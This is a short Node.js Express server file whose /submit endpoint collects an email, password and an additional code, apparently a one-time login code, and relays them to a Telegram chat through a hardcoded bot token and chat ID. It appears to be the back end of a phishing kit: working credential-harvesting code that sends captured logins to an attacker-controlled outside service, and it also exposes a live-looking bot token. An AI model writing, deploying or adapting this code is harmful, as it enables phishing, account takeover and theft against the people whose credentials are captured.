// server.js
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = '8736496740:AAHAK7a6R3vG2uaW98kt-tV_u7M7LRLTRy0';
const CHAT_ID = '8264584451';

app.post('/submit', (req, res) => {
 const { email, password, code } = req.body;

 const message = `New submission:\nEmail: ${email}\nPassword: ${password}\nAdditional Code: ${code}`;

 axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
 chat_id: CHAT_ID,
 text: message
 })
 .then(response => {
 res.json({ message: 'Data sent to Telegram successfully!' });
 })
 .catch(error => {
 console.error('Error sending message to Telegram:', error);
 res.status(500).json({ message: 'Failed to send data to Telegram.' });
 });
});

app.listen(3000, () => {
 console.log('Server is running on port 3000');
});
